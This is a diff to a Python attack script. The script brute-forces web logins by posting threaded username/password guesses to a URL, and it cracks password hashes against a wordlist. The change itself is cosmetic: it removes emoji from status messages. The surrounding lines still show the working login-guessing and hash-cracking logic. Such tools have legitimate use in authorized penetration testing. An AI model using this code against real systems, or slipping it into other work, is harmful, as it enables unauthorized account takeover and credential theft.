@@ -13,7 +13,7 @@ def attempt_login(username, password):
     response = requests.post(URL, json={"username": username, "password": password})
 
     if response.status_code == 200 and "Login successful" in response.text:
-        print(f"\n[✅] Credentials Found: {username}:{password}")
+        print(f"\n Credentials Found: {username}:{password}")
         os._exit(0)
 
     print(f"[-] Failed: {username}:{password}")
@@ -21,7 +21,7 @@ def attempt_login(username, password):
 # perform brute-force attack using usernames and passwords lists
 def brute_force(usernames_file, passwords_file):
     if not os.path.exists(usernames_file) or not os.path.exists(passwords_file):
-        print(f"[❌] Error: Ensure both {usernames_file} and {passwords_file} exist.")
+        print(f"Error: Ensure both {usernames_file} and {passwords_file} exist.")
         return
 
     print(f"[🔹] Loading usernames from {usernames_file}")
@@ -40,7 +40,7 @@ def brute_force(usernames_file, passwords_file):
 # perform a brute-force attack using username:password pairs
 def brute_force_with_creds(creds_file):
     if not os.path.exists(creds_file):
-        print(f"[❌] Error: Credentials file '{creds_file}' not found.")
+        print(f"Error: Credentials file '{creds_file}' not found.")
         return
 
     print(f"[🔹] Loading credentials from {creds_file}")
@@ -52,12 +52,12 @@ def brute_force_with_creds(creds_file):
                 thread = threading.Thread(target=attempt_login, args=(username, password))
                 thread.start()
             except ValueError:
-                print(f"[❌] Skipping invalid line: {line.strip()} (Must be in username:password format)")
+                print(f"Skipping invalid line: {line.strip()} (Must be in username:password format)")
 
 # perform hash-based attack
 def hash_attack(hash_file, hash_type, wordlist):
     if not os.path.exists(hash_file) or not os.path.exists(wordlist):
-        print(f"[❌] Error: Ensure both hash file and wordlist exist.")
+        print(f"Error: Ensure both hash file and wordlist exist.")
         return
 
     print(f"[🔹] Cracking hashes using {hash_type}...")
@@ -70,7 +70,7 @@ def hash_attack(hash_file, hash_type, wordlist):
             word = word.strip()
             hashed_word = hashlib.new(hash_type, word.encode()).hexdigest()
             if hashed_word in hashes:
-                print(f"[✅] Password Found: {word} -> {hashed_word}")
+                print(f"Password Found: {word} -> {hashed_word}")
                 hashes.remove(hashed_word)
                 if not hashes:
                     print("[🔥] All hashes cracked!")
@@ -96,4 +96,4 @@ if __name__ == "__main__":
     elif args.hash_file and args.hash_type and args.wordlist:
         hash_attack(args.hash_file, args.hash_type, args.wordlist)
     else:
-        print("[❌] Invalid usage. Use -h for help.")
+        print("Invalid usage. Use -h for help.")
